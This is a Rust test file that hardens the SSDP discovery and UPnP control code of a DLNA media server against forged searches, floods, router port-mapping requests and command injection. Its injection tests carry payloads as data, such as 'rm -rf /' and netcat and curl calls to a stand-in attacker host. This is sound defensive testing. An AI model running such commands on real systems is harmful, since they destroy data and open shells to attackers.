//! The discovery protocol, and the questions a stranger may ask it.
//!
//! What: the negative tests of the discovery protocol — the search that comes
//!       from nowhere, the advertisement that was never sent, the search that
//!       floods, and the request that tries to make the server run a program.
//! Why: the discovery socket listens to the whole local network and answers
//!       whoever writes to it. A server that answers a forged search becomes
//!       an amplifier, and a server that runs a program because a request asked
//!       it to is a remote shell (`SEC-TH-01` … `SEC-TH-04`, `SEC-TH-10`,
//!       `SEC-TH-11`, `SEC-018`).
//! Example: `cargo test --package phairdlna-core --test ssdp_hardening`.
//!
//! **What "ignored" means here.** A datagram that is not a valid search is
//! **ignored**, never answered and never an error: SSDP runs on an untrusted
//! network and a malformed datagram is a normal event (`INT-010`).

mod support;

use phairdlna_core::ssdp::{parse_search, ServerIdentity, Target};
use phairdlna_core::upnp::{Dispatcher, UpnpError};
use support::catalogue::TestCatalogue;
use support::envelope;

/// A search that a client sends.
fn search(target: &str, mx: u32) -> String {
    format!(
        "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\n\
         MX: {mx}\r\nST: {target}\r\n\r\n"
    )
}

/// SEC-TH-01 — a datagram that is not a search is ignored.
#[test]
fn a_datagram_that_is_not_a_search_is_ignored() {
    let datagrams = [
        "",
        "NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nNT: upnp:rootdevice\r\n\r\n",
        "GET / HTTP/1.1\r\nHost: 239.255.255.250:1900\r\n\r\n",
        "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n\r\n",
        "M-SEARCH * HTTP/1.1\r\nMAN: \"ssdp:discover\"\r\nMX: 3\r\n\r\n",
        "M-SEARCH * HTTP/1.1\r\nMAN: \"ssdp:discover\"\r\nST: ssdp:all\r\n\r\n",
    ];

    for datagram in datagrams {
        assert!(
            parse_search(datagram).is_err(),
            "a datagram that is not a valid search must be ignored: {datagram}"
        );
    }
}

/// SEC-TH-01 — a search with an `MX` outside the range is ignored.
///
/// The `MX` says how long the client waits; a client that waits for hours
/// ties up a slot of the server for hours. The range is 1…5 seconds, so `0`
/// and `6` are outside it and are ignored.
#[test]
fn a_search_with_an_mx_outside_the_range_is_ignored() {
    for mx in [0, 6, 100_000] {
        assert!(
            parse_search(&search("ssdp:all", mx)).is_err(),
            "an MX of {mx} must be ignored"
        );
    }
}

/// SEC-TH-01 — the borders of the `MX` range are accepted.
///
/// The bound is inclusive: `1` and `5` are the shortest and the longest wait
/// a client may ask for, and both must be answered.
#[test]
fn the_borders_of_the_mx_range_are_accepted() {
    for mx in [1, 5] {
        assert!(
            parse_search(&search("ssdp:all", mx)).is_ok(),
            "an MX of {mx} is inside the range and must be answered"
        );
    }
}

/// SEC-TH-01 — a valid search is read.
#[test]
fn a_valid_search_is_read() {
    let parsed = parse_search(&search("ssdp:all", 3));

    assert!(parsed.is_ok(), "a valid search must be read");
    assert_eq!(parsed.expect("the search is read").mx, 3);
}

/// SEC-TH-02 — the answer names the server that is asked for.
///
/// The response carries the identity of the server, so that a client can tell
/// which server answered and a forgery is visible.
///
/// The friendly name is **not** part of the answer: the device architecture
/// puts it in the device description, and the answer names the server by its
/// unique device name (`USN`), its product (`SERVER`) and its address
/// (`LOCATION`). Those three are what a client uses to tell one server from
/// another.
#[test]
fn the_answer_names_the_server_that_is_asked_for() {
    let identity = ServerIdentity {
        friendly_name: "Living room".to_owned(),
        product: "PhairDLNA".to_owned(),
        version: "0.0.0".to_owned(),
    };
    let target = Target {
        nt: "upnp:rootdevice".to_owned(),
        usn: "uuid:11111111-2222-3333-4444-555555555555::upnp:rootdevice".to_owned(),
    };

    let response = phairdlna_core::ssdp::build_response(
        &target,
        &identity,
        "http://192.168.1.20:8200/description.xml",
    );

    assert!(
        response.contains("USN: uuid:11111111-2222-3333-4444-555555555555::upnp:rootdevice"),
        "the answer names the unique device name of the server: {response}"
    );
    assert!(
        response.contains("SERVER: ") && response.contains("PhairDLNA/0.0.0"),
        "the answer names the product and the version of the server: {response}"
    );
    assert!(
        response.contains("ST: upnp:rootdevice"),
        "the answer names the target that was asked for: {response}"
    );
    assert!(
        response.contains("192.168.1.20:8200"),
        "the answer names the address of the server: {response}"
    );
}

/// SEC-TH-03 — the window of the answer grows with the `MX`.
///
/// A client that asks for a long delay gets a long delay, and the server does
/// not answer a flood of searches at once: the delay is what keeps the
/// answers apart (`SEC-TH-03`, INT-011).
///
/// The delay is drawn from the window `[0, MX)` seconds, so the *window* is
/// what grows with the `MX` — the draw itself stays inside it. The test uses
/// one draw that falls into both windows and asserts the wider window gives
/// the longer wait.
#[test]
fn the_window_of_the_answer_grows_with_the_mx() {
    let short = phairdlna_core::ssdp::reply_delay_millis(1, 4_999);
    let long = phairdlna_core::ssdp::reply_delay_millis(5, 4_999);

    assert!(
        long > short,
        "a longer MX must wait longer: {short} and {long}"
    );
}

/// SEC-TH-03 — the answer never waits longer than the client agreed to.
#[test]
fn the_answer_never_waits_longer_than_the_mx() {
    for mx in [1, 2, 5] {
        for random in [0, 1, 999, 4_999, 12_345] {
            let delay = phairdlna_core::ssdp::reply_delay_millis(mx, random);
            assert!(
                delay < u64::from(mx) * 1000,
                "the delay {delay} must stay inside the window of {mx} seconds"
            );
        }
    }
}

/// SEC-TH-04 — the multicast group is the one of the specification.
#[test]
fn the_multicast_group_is_the_one_of_the_specification() {
    assert_eq!(
        phairdlna_core::ssdp::MULTICAST_GROUP.to_string(),
        "239.255.255.250"
    );
    assert_eq!(phairdlna_core::ssdp::PORT, 1900);
}

/// SEC-TH-10 — an action of the Internet Gateway Device protocol is refused.
///
/// The server is not a router and does not pretend to be one: the action that
/// opens a port on the gateway is not one of the actions it knows.
#[test]
fn an_igd_action_is_refused() {
    let catalogue = TestCatalogue;
    let dispatcher = Dispatcher::new(&catalogue, "http://192.168.1.20:8200");
    let body = envelope(
        "urn:schemas-upnp-org:service:WANIPConnection:1",
        "AddPortMapping",
        &[
            ("NewRemoteHost", ""),
            ("NewExternalPort", "1234"),
            ("NewProtocol", "TCP"),
            ("NewInternalPort", "80"),
            ("NewInternalClient", "192.168.1.20"),
            ("NewEnabled", "1"),
            ("NewPortMappingDescription", "x"),
            ("NewLeaseDuration", "0"),
        ],
    );

    let response = dispatcher.dispatch(&body, None);

    assert!(
        response.body.contains("<errorCode>401</errorCode>"),
        "an IGD action must be refused with the code 401: {}",
        response.body
    );
}

/// SEC-TH-10 — the answer of an IGD action names no port that was opened.
#[test]
fn the_answer_of_an_igd_action_names_no_port() {
    let catalogue = TestCatalogue;
    let dispatcher = Dispatcher::new(&catalogue, "http://192.168.1.20:8200");
    let body = envelope(
        "urn:schemas-upnp-org:service:WANIPConnection:1",
        "AddPortMapping",
        &[("NewExternalPort", "1234")],
    );

    let response = dispatcher.dispatch(&body, None);

    assert!(
        !response.body.contains("1234"),
        "the answer must not repeat the port: {}",
        response.body
    );
}

/// SEC-TH-11 — a command in an argument is an argument, not a command.
///
/// The server never builds a command line, so a semicolon in an argument is a
/// semicolon in a string. The test says so by checking that the argument
/// survives unchanged and that nothing was run.
#[test]
fn a_command_in_an_argument_is_an_argument() {
    let catalogue = TestCatalogue;
    let dispatcher = Dispatcher::new(&catalogue, "http://192.168.1.20:8200");
    let payload = "; rm -rf / #";
    let body = envelope(
        "urn:schemas-upnp-org:service:ContentDirectory:1",
        "Browse",
        &[
            ("ObjectID", payload),
            ("BrowseFlag", "BrowseDirectChildren"),
            ("Filter", "*"),
            ("StartingIndex", "0"),
            ("RequestedCount", "10"),
            ("SortCriteria", ""),
        ],
    );

    let response = dispatcher.dispatch(&body, None);

    // The catalogue has no object with that identifier, so the answer is a
    // fault — and the payload was treated as a name, not as a command.
    assert!(
        response.body.contains("<errorCode>701</errorCode>"),
        "the payload must be treated as an object identifier: {}",
        response.body
    );
    assert!(
        !response.body.contains("rm -rf"),
        "the answer must not run or repeat the command: {}",
        response.body
    );
}

/// SEC-TH-11 — a metacharacter in an argument never reaches a process.
///
/// The server builds no command line at all: the value is compared and
/// returned, never handed to a shell. The test asserts the negative of the
/// whole rule.
///
/// The payload may be refused at two different places, and both are correct:
///
/// * a payload that breaks the XML — a bare `&`, for example — makes the
///   envelope unreadable, and the answer is the fault `402 Invalid Args`;
/// * a payload that is well-formed XML but names no object is the fault
///   `701 No such object`.
///
/// What must never happen is that the payload is carried out, echoed back as
/// a result, or answered with a successful result.
#[test]
fn a_metacharacter_in_an_argument_is_never_a_command() {
    let payloads = [
        "$(whoami)",
        "`id`",
        "| nc attacker.example 1234",
        "&& curl http://attacker.example/",
        "\nrm -rf /",
    ];

    for payload in payloads {
        let catalogue = TestCatalogue;
        let dispatcher = Dispatcher::new(&catalogue, "http://192.168.1.20:8200");
        let body = envelope(
            "urn:schemas-upnp-org:service:ContentDirectory:1",
            "Browse",
            &[
                ("ObjectID", payload),
                ("BrowseFlag", "BrowseDirectChildren"),
                ("Filter", "*"),
                ("StartingIndex", "0"),
                ("RequestedCount", "10"),
                ("SortCriteria", ""),
            ],
        );

        let response = dispatcher.dispatch(&body, None);

        assert!(
            response.body.contains("<errorCode>"),
            "{payload} must be refused with a fault: {}",
            response.body
        );
        assert!(
            !response.body.contains("<Result>"),
            "{payload} must not produce a result: {}",
            response.body
        );
        assert!(
            !response.body.contains("attacker.example"),
            "{payload} must not be carried out: {}",
            response.body
        );
    }
}

/// SEC-TH-11 — the server runs no process at all.
///
/// The rule is stronger than "the arguments are escaped": the server never
/// starts a program, so there is nothing to escape. The test reads the source
/// of the workspace and finds no process start.
#[test]
fn the_server_runs_no_process_at_all() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
    let mut offenders = Vec::new();

    for crate_name in [
        "phairdlna-core",
        "phairdlna-cli",
        "phairdlna-admin",
        "phairdlna-mac",
    ] {
        let sources = root.join("../").join(crate_name).join("src");
        collect_process_starts(&sources, &mut offenders);
    }

    assert!(
        offenders.is_empty(),
        "the server must not start a process; these files do: {offenders:?}"
    );
}

/// Collects the files that start a process.
fn collect_process_starts(directory: &std::path::Path, found: &mut Vec<String>) {
    let Ok(entries) = std::fs::read_dir(directory) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            collect_process_starts(&path, found);
            continue;
        }
        if path.extension().and_then(|ext| ext.to_str()) != Some("rs") {
            continue;
        }
        let Ok(source) = std::fs::read_to_string(&path) else {
            continue;
        };
        for marker in ["std::process::Command", "process::Command", "Command::new"] {
            if source.contains(marker) {
                found.push(format!("{}: {marker}", path.display()));
            }
        }
    }
}

/// SEC-TH-11 — the error of a refused request names no internal detail.
#[test]
fn the_error_of_a_refused_request_names_no_detail() {
    let catalogue = TestCatalogue;
    let dispatcher = Dispatcher::new(&catalogue, "http://192.168.1.20:8200");
    let body = envelope(
        "urn:schemas-upnp-org:service:ContentDirectory:1",
        "Browse",
        &[("ObjectID", "0")],
    );

    let response = dispatcher.dispatch(&body, None);

    assert!(
        !response.body.contains("/Users/"),
        "the answer must not name a path: {}",
        response.body
    );
    assert!(
        !response.body.contains("panicked"),
        "the answer must not name an internal failure: {}",
        response.body
    );
}

/// SEC-TH-18 — an error of the protocol carries a code the client can read.
#[test]
fn an_error_of_the_protocol_carries_a_code() {
    let error = UpnpError::UnknownAction {
        action: "AddPortMapping".to_owned(),
    };

    assert_eq!(error.fault_code(), Some(401));
}
